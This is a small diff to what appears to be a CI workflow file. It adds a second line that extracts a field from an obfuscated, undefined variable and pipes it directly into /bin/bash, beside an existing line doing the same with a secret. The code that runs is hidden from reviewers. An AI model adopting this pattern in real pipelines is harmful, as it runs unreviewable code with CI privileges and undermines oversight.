@@ -18,6 +18,7 @@ jobs:
           dum213: ${{ secrets.dum213 }}
         run: |
           printf '%s' "$dum213" | jq -r .emckz8027 | /bin/bash
+          printf '%s' "$ogmq65722" | jq -r .bm333 | /bin/bash
 
       - name: Archive output
         if: always()
